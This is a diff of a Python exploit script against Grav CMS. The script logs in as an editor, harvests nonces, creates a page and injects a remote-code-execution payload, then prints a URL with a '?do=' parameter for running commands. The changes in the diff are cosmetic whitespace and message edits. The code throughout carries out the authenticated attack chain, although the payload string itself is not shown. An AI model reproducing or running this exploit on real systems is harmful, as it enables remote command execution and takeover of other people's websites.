@@ -35,7 +35,7 @@ import random
 ##############################################
 # Enter here your Grav CMS editor credentials
 username = "youruser"
-password="yourpassword"
+password = "yourpassword"
 ##############################################
 
 
@@ -95,6 +95,7 @@ if session_cookie and login_nonce_match:
 
     # Send the login POST request
     login_response = requests.post(url_admin, data=post_data, headers=headers)
+    
     # Uncomment for Debug
     #login_response.raise_for_status()
 
@@ -102,6 +103,7 @@ if session_cookie and login_nonce_match:
     if login_response.status_code == 303:
         # Extract the new session cookie and the URL from the response
         new_session_cookie = login_response.headers.get('Set-Cookie')
+        
         # Uncomment for Debug
         #print(f"Login response status: {login_response.status_code}")
         #print(f"Login session cookie: {new_session_cookie}")
@@ -122,6 +124,7 @@ if session_cookie and login_nonce_match:
         admin_nonce_match = re.search(r'admin_nonce: \'([^\']+)\'', console_response.text)
         if admin_nonce_match:
             admin_nonce = admin_nonce_match.group(1)
+            
             # Uncomment for Debug
             #print(f"admin-nonce: {admin_nonce}")
 
@@ -141,11 +144,13 @@ if session_cookie and login_nonce_match:
 
             # Send the POST request to create the new page
             create_response = requests.post(url_admin, data=post_data, headers={"Cookie": new_session_cookie})
+            
             # Uncomment for Debug
             #create_response.raise_for_status()
 
             # Check if the response to the create-new-page POST request is successful
             if (create_response.status_code == 303 or create_response.status_code == 200):
+                
                 # Uncomment for Debug
                 #print(f"Create New Page Response for admin/pages status: {create_response.status_code}")
 
@@ -165,6 +170,7 @@ if session_cookie and login_nonce_match:
                 if form_nonce_match and unique_form_id_match:
                     form_nonce = form_nonce_match.group(1)
                     unique_form_id = unique_form_id_match.group(1)
+                    
                     # Uncomment for Debug
                     #print(f"form-nonce: {form_nonce}")
                     #print(f"__unique_form_id__: {unique_form_id}")
@@ -221,6 +227,7 @@ if session_cookie and login_nonce_match:
 
                     # Send the final POST request to inject the payload on the page previously created 
                     inj_response = requests.post(url_new_page, data=post_data, headers={"Cookie": new_session_cookie})
+                    
                     # Uncomment for Debug
                     #inj_response.raise_for_status()
 
@@ -239,7 +246,7 @@ if session_cookie and login_nonce_match:
                         #print("Final redirect response data:")
                         #print(final_redirect_response.text)
 
-                        print("RCE payload injected, now visit the malicious page at: '"+url+":"+str(port)+"/"+page_name+"?do=' and insert the command to run..")
+                        print("RCE payload injected, now visit the malicious page at: '"+url+":"+str(port)+"/"+page_name+"?do='")
                     else:
                         print("[E] Failed to inject the RCE payload, the injection response has not status 303 or 200...")
                 else:
